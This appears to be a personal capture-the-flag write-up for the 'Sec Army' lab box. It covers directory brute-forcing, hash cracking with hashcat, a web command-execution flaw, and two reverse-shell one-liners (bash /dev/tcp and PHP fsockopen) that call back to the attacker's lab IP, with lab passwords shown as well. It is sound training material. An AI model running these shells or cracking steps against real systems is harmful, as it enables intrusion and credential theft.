# Sec Army CTF

>Abdullah Rizwan | 29 October , 6:12 PM

## NMAP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 18:11 PKT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 18:11 (0:00:12 remaining)
Nmap scan report for 192.168.1.5
Host is up (0.00012s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2c:54:d0:5a:ae:b3:4f:5b:f8:65:5d:13:c9:ee:86:75 (RSA)
|   256 0c:2b:3a:bd:80:86:f8:6c:2f:9e:ec:e4:7d:ad:83:bf (ECDSA)
|_  256 2b:4f:04:e0:e5:81:e4:4c:11:2f:92:2a:72:95:58:4e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Totally Secure Website
MAC Address: 08:00:27:4D:91:E3 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

# Challenge 1 (Uno)

By visting the web page which is hosted on PORT 80 we will given task 1 to solve

<img src="https://imgur.com/tdQ0t30.png"/>

Now it says that there might be a hidden directory so lets brute force directory

```
gobuster dir -u http://192.168.1.5:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```
<img src="https://imgur.com/i69lDkh.png"/>


Here we can see `/anon` so let's visit this directory

<img src="https://imgur.com/tDDdXo6.png"/>

Now you won't see the text because it is hidden by making the text color white so it's important select all text or visit the source code of page

<img src="https://imgur.com/Oa0JvTo.png"/>

This may be credentials for the user for ssh lets try doing that

<img src="https://imgur.com/FtYdmdB.png"/>

And we got in , got a foothold!

<img src="https://imgur.com/wb4YlqC.png"/>

We easily solved the challenge 

But there is a `readme.txt` file which says

<img src="https://imgur.com/gSlRClT.png"/>

# Challenge 2 (Dos)

The `readme.txt` file which you have just read gives password for the user `dos` lets see if that user actually exists on this box

```
root:x:0:0:root:/root:/bin/bash                                           
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                      
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                      
sync:x:4:65534:sync:/bin:/bin/sync                                        
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
uno:x:1001:1001:,,,:/home/uno:/bin/bash
dos:x:1002:1002:,,,:/home/dos:/bin/bash
tres:x:1003:1003:,,,:/home/tres:/bin/bash
cuatro:x:1004:1004:,,,:/home/cuatro:/bin/bash
cinco:x:1005:1005:,,,:/home/cinco:/bin/bash
seis:x:1006:1006:,,,:/home/seis:/bin/bash
siete:x:1007:1007:,,,:/home/siete:/bin/bash
ocho:x:1008:1008:,,,:/home/ocho:/bin/bash
nueve:x:1009:1009:,,,:/home/nueve:/bin/bash
ftp:x:108:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
cero:x:1000:1000:,,,:/home/cero:/bin/bash

```
And appearenlty he does ! So let's try to use switch user


<img src="https://imgur.com/SMJnL96.png"/>

We successfully switched to `don`

```
dos@svos:~$ ls -la
total 180
drwx------  7 dos  dos    4096 Oct 19 19:46 .
drwxr-xr-x 12 root root   4096 Oct 19 11:05 ..
-rw-rw-r--  1 dos  dos      47 Oct  5 09:24 1337.txt
-rw-r--r--  1 dos  dos     220 Sep 22 11:36 .bash_logout
-rw-r--r--  1 dos  dos    3771 Sep 22 11:36 .bashrc
drwx------  2 dos  dos    4096 Sep 22 12:49 .cache
drwx------  2 dos  dos    4096 Sep 22 13:59 .elinks
drwxr-xr-x  2 dos  dos  135168 Sep 27 14:51 files
drwx------  3 dos  dos    4096 Sep 22 12:49 .gnupg
drwxrwxr-x  3 dos  dos    4096 Sep 22 13:24 .local
-rw-r--r--  1 dos  dos     807 Sep 22 11:36 .profile
-rw-rw-r--  1 dos  dos     104 Sep 23 09:52 readme.txt
dos@svos:~$ cat readme.txt 
You are required to find the following string inside the files folder:
a8211ac1853a1235d48829414626512a
dos@svos:~$ 

```

Now this says to find `a8211ac1853a1235d48829414626512a` this string which actually a md5 hash in folder `files` but problem is that that folder has 5001 text files

<img src="https://imgur.com/tmr2MVG.png"/>

To be honest I did'nt know the command for looking for a text in files so I just used google 

<img src="https://imgur.com/uUSVxjL.png"/>

That returned me the result that I wanted

<img src="https://imgur.com/Dj2b95d.png"/>


<img src="https://imgur.com/ZycG1Rt.png"/>

Now it's telling you to look at `file3131.txt` which gives us

<img src="https://imgur.com/qxflZ1x.png"/>

```
UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
tPY+AAAAQQAAABQAAABjaGFsbGVuZ2UyL2ZsYWcyLnR4dHPOz0svSiwpzUksyczPK1bk4vJILUpV
L1aozC8tUihOTc7PS1FIy0lMB7LTc1PzSqzAPKNqMyOTRCPDWi4AUEsDBBQDAAAIADOiO1Eoztrt
dAAAAIEAAAATAAAAY2hhbGxlbmdlMi90b2RvLnR4dA3KOQ7CMBQFwJ5T/I4u8hrbdCk4AUjUXp4x
IsLIS8HtSTPVbPsodT4LvUanUYff6bHd7lcKcyzLQgUN506/Ohv1+cUhYsM47hufC0WL1WdIG4WH
80xYiZiDAg8mcpZNciu0itLBCJMYtOY6eKG8SjzzcPoDUEsBAj8DFAMAAAAAM6I7UQAAAAAAAAAA
AAAAAAsAJAAAAAAAAAAQgO1BAAAAAGNoYWxsZW5nZTIvCgAgAAAAAAABABgAgMoyJN2U1gGA6WpN
3pDWAYDKMiTdlNYBUEsBAj8DFAMAAAgAFZI2UdrgtPY+AAAAQQAAABQAJAAAAAAAAAAggKSBKQAA
AGNoYWxsZW5nZTIvZmxhZzIudHh0CgAgAAAAAAABABgAAOXQa96Q1gEA5dBr3pDWAQDl0GvekNYB
UEsBAj8DFAMAAAgAM6I7USjO2u10AAAAgQAAABMAJAAAAAAAAAAggKSBmQAAAGNoYWxsZW5nZTIv
dG9kby50eHQKACAAAAAAAAEAGACAyjIk3ZTWAYDKMiTdlNYBgMoyJN2U1gFQSwUGAAAAAAMAAwAo
AQAAPgEAAAAA
```
If you have done some CTF's the works thing that should come to your mind is that this is a base64 encoded text :D

Head over to `cyberchef` 

<img src="https://imgur.com/M7GfiBO.png"/>

You might see something like this `challenge2/flag2.txt`

Hover your curosr next to `Output` on that something like a magic stick icon and you'll get your second flag

<img src="https://imgur.com/4y9mKR1.png"/>

We can see a text from `todo.txt`

```
Although its total WASTE but... here's your super secret token: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b
```

# Challegne 3 (Tres)

As on the user dos's directory we can see a hint that 

```
dos@svos:~$ cat 1337.txt 
Our netcat application is too 1337 to handle..
```
This refers to port `1337` on the box so

<img src="https://imgur.com/mR1QqhC.png"/>

I tried looking for a parameter `?p=1` , `?secret=2`, `?token=3` , `?waste=3` but since this isn't a php file hosted these won't work

<img src="https://imgur.com/hXe8g2O.png"/>

Then I focused on the hint and it was mentioned `netcat application is too 1337 to handle` . I quickly visited goolge for answers

https://unix.stackexchange.com/questions/332163/netcat-send-text-to-echo-service-read-reply-then-exit

I did find something

<img src="https://imgur.com/mm8IDq3.png"/>

echo that token and pipe it to `netcat` by specifing IP and port

<img src="https://imgur.com/pdJqNtG.png"/>

# Challenge 4 (Cuatro)

Now we are in as `tres` so let's start exploring his `home` directory

<img src="https://imgur.com/7718Toh.png"/>

<img src="https://imgur.com/5JKkCKO.png"/>

Now we are presented with a binary exploitation challenge(Buffer Overflow) , we can see a binary file `secarmy-village` . But running it gives us an error

<img src="https://imgur.com/eT2ocfv.png"/>


I couldn't figure it out what was I supposed to fix in this binary , I had an idea to do something with `ghidra` but I failed to do it .

# Challenge 5 (Cinco)

when you visit `/var/www/html` this is where your webpage are being hosted , on visiting we can find directories and webpages there 

<img src="https://imgur.com/u7rBseo.png"/>

`anon` directory was the one which we came to know through `gobuster` so we know that these will be shown or port80 , let's try `justanothergallery`

<img src="https://imgur.com/Glc0UT6.png"/>

It has an `index.php` page and a sub directory of `qr` which contains a lot of qr code images that we scan 

<img src="https://imgur.com/EOKkDJW.png"/>
We can this qr code from any qr android application which can be downloaded through playstore or from wherever you prefer

By scanning this qr code we will get the text `presented`

```
image-0 Hello
image-1 and
image-2 congrats
image-3 for
image-4 solving
image-5 this
image-6 challenge,
image-7 we
image-8 hope
image-9 that
image-10 you
image-11 enojoyed
image-12 the
image-13 challenges
image-14 we
image-15 presented
image-16 so
image-17 far.
image-18 It
image-19 is
image-20 time
image-21 for
image-22 us
image-23 to
image-24 increase
image-25 the
image-26 difficulty
image-27 level
image-28 and
image-29 make
image-30 the
image-31 upcoming
image-32 challenges
image-33 more
image-34 challenging
image-35 than
image-36 previous
image-37 ones.
image-38 Before
image-39 you
image-40 move
image-41 to
image-42 the
image-43 next
image-44 challenge,
image-45 here
image-46 are
image-47 the
image-48 credentials
image-49 for
image-50 the
image-51 5th
image-52 user
image-53 cinco:ruy70m35
image-54 head
image-55 over
image-56 to
image-57 this
image-58 user
image-59 and
image-60 get
image-61 your
image-62 5th
image-63 flag!
image-64 goodluck
```
Ahhhh , so I scanned the 64 qr images through my phone and got credentials for `cinco:ruy70m35` 


<img src="https://imgur.com/7OCvghc.png"/>

<img src="https://imgur.com/oPcojH9.png"/>

Now the `readme.txt` says

```
cinco@svos:~$ cat readme.txt 
Check for Cinco's secret place somewhere outside the house
cinco@svos:~$ 

```
By "looking outside the house" it means to look outside the `~` (home) directory

Here we find `cincos-secrets`

<img src="https://imgur.com/YWRlVWk.png"/>

This is all we get at `cincos-secrets`

<img src="https://imgur.com/CQI7QWO.png"/>

We know that `shadow.bak` which is backup of the original `shadow` file belongs to `cincos` so we can change permissions for the file since it belongs to us 

It doesn't matter which permissions you give but in a real sceanrio you should give permissions to that specific user like this

`chmod u+rwx shadow.bak` or depending upon the type of file it is
Or

`chmod 700 shadow.bak`
<img src="https://imgur.com/pcqSrVj.png"/>

On reading file we will see a hash

```
seis:$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::
```
We already know from the hint that we need to user `rockyou.txt`

Copy this whole hash and put it in a file , not necessary to give a `txt` extension. Now you can either use `john the ripper` or `hashcat` , for me `john the ripper` was taking too long so I used hashcat (although it doesn't work sometimes on windows but it dit work :D)

```
hashcat -a 0 -m 1800 -o cracked.txt hash /usr/share/wordlists/rockyou.tx
```
<img src="https://imgur.com/85KMkvx.png"/>

<img src="https://imgur.com/aMxbMS4.png"/>

<img src="https://imgur.com/TLZZto3.png">


# Challenge 6 (Seis)

<img src="https://imgur.com/PgXc19M.png"/>

I didn't solve this one in order xD


# Challenge 7 (Siete)

Visiting `/var/www/html` we will see `shellcmsdashboard`  so lets hop over to that directory


<img src="https://imgur.com/TaNLw4Q.png"/>

<img src="https://imgur.com/YMXMEKL.png"/>

<img src="https://imgur.com/qRckTBq.png"/>

Coming back to the box , we can a `robots.txt` by reading it we can a password there

<img src="https://imgur.com/cTJTeuL.png"/>

On giving the right credentials , it's going to point us to go on the next page

<img src="https://imgur.com/a92bbVl.png"/>


<img src="https://imgur.com/nzB6whl.png"/>

Now this here is a RCE vulnerability , we can give any command we want and it will execute this for us 

<img src="https://imgur.com/KWOUcYI.png"/>

Now we have seen that there was `readme9213.txt` we can easily read it because we are `www-data` in this case and that file belongs it .


But doing `cat readme9213.txt ` won't give us the result so we need a reverse shell in order to read that file.

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

bash -i >& /dev/tcp/192.168.1.7/4444 0>&1 - This did'nt worked 
php -r '$sock=fsockopen("192.168.1.7",4444);exec("/bin/sh -i <&3 >&3 2>&3");' This did

<img src="https://imgur.com/gG2jzrk.png"/>

<img src="https://imgur.com/nON3h4W.png"/>

We cannot read the file because it's permissions are to just `write` and `execute` but since it belongs to us we can pretty much change it to readable.
```
/var/www/html/shellcmsdashboard
$ cat readme9213.txt
cat: readme9213.txt: Permission denied
$ ls -la
total 24
drwxrwxrwx 2 root     root 4096 Oct 18 15:02 .
drwxr-xr-x 5 root     root 4096 Oct  8 17:51 ..
-rwxrwxrwx 1 root     root 1459 Oct  1 17:57 aabbzzee.php
-rwxrwxrwx 1 root     root 1546 Oct 18 15:02 index.php
--wx-wx-wx 1 www-data root   48 Oct  8 17:54 readme9213.txt
-rwxrwxrwx 1 root     root   58 Oct  1 17:37 robots.txt
$ chmod u=rwx readme9213.txt
$ cat readme9213.txt
password for the seventh user is 6u1l3rm0p3n473
$ 

```

<img src="https://imgur.com/cecymw8.png"/>


<img src="https://imgur.com/ITkR23I.png"/>

Hint is given which tells that the message is a decimal text 

<img src="https://imgur.com/6PY0UhO.png"/>

On decoding the message from deciaml we get 

<img src="https://imgur.com/5hzbZ38.png"/>

I wasn't able to solve this challenge so couldn't proceed any further.

# End

So I didn't see how the remaining challenges looked like , although it was easy but I didn't had that much exposure to CTF competitions.
<img src="https://imgur.com/IFlAfG3.png"/>
